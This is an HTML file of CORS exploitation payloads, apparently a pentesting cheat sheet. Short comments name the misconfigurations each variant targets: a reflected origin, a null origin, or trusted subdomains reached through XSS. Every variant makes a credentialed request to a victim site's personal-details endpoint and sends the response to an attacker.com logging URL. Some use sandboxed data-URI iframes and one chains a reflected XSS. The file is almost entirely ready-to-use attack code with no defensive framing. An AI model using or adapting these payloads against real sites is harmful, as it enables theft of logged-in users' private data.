<!--
CORS script to get some sensitive information from victim website in your website when misconfiguration like:
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
basically any origin accepted and given full access
-->
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://victim.com/personal-dets',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://attacker.com/log?d='+this.responseText;
    };
</script>

<script>
var req = new XMLHttpRequest();

req.onload = function() {
    var data = encodeURIComponent(this.responseText);
    location = "https://attacker.com/log?d=" + data;
};

req.open("GET", "https://victim.com/personal-dets", true);
req.withCredentials = true;
req.send();
</script>

<!--
CORS script to get some sensitive information from victim website in your website when misconfiguration like:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Basically null origin accepted and given access
-->

<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://victim.com/personal-dets',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://attacker.com/log?d='+this.responseText;
};
</script>"></iframe>

<iframe sandbox="allow-scripts"
src="data:text/html,%3Cscript%3E
var req = new XMLHttpRequest();
req.onload = function() {
    new Image().src='https://attacker.com/log?d='+encodeURIComponent(this.responseText);
};
req.open('GET','https://victim.com/personal-dets',true);
req.withCredentials=true;
req.send();
%3C/script%3E">
</iframe>

<!--
CORS script to get some sensitive information from victim website in your website through XSS and misconfiguration that allows all/any subdomains of the site:
Basically any subdomain origin accepted and sensitive info taken through XSS
-->

<script>
    document.location="https://victim.com/site/?xss_vuln_param=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://victim.com/site/personal-dets',true); req.withCredentials = true;req.send();function reqListener() {location='https://attacker.com/log?d='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
